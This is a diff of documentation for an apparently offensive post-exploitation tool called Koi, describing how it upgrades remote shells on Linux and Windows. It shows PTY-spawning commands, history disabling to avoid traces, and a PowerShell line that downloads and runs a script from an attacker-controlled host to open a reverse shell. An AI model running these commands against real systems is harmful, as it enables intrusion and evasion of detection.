@@ -1,18 +1,22 @@
-# Upgrading your sessions
+# Upgrading Sessions
 
-Koi allows you to automatically upgrade your sessions for both Windows and Linux.
+Koi allows you to automatically upgrade your sessions for both Linux and Windows.
 
-## For Linux 
+## For Linux
 
-As of now, linux is pretty straight forward. It spawns a pty with python **on the remote machine**
+The upgrade command tries three methods in order, falling back to the next if the previous one fails or is not available:
 
-```bash
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-```
+1. **`script`**, spawns a PTY using the `script` utility, available on virtually every Linux system:
+   ```bash
+   script -qc /bin/bash /dev/null
+   ```
+2. **`socat`**, if `script` is absent, tries `socat` as an alternative PTY spawner.
+3. **Fallback**, if neither is available, runs `/bin/bash -i` or `/bin/sh -i` for a basic interactive shell without full PTY support.
 
-So you can already see where the issue is. If you work with a machine without python, the pty won't spawn. Or most EDR flags /bin/bash
+After the PTY is established, Koi sets `TERM=xterm-256color`, disables history (`HISTSIZE=0 HISTFILESIZE=0`), and syncs the terminal window size.
 
-This feature needs upgrading and this is talked about in the [future updates](future-updates.md).
+!!! warning "Limitations"
+    If none of these commands are available, or if the shell is too restricted, the upgrade will fail or produce a degraded shell. Alternative upgrade paths are planned, see [Future Updates](future-updates.md).
 
 ---
 
@@ -39,7 +43,7 @@ IEX(IWR 'http://<LOCAL_IP>:<HTTP_PORT>/c.ps1' -UseBasicParsing);
 <OBFUSCATED_FUNCTION> -RemoteIp <LOCAL_IP> -RemotePort <PORT> -Rows <ROWS> -Cols <COLS> -CommandLine powershell"
 ```
 
-### A bit more explainations
+### More details
 
 #### Automatic caching
 
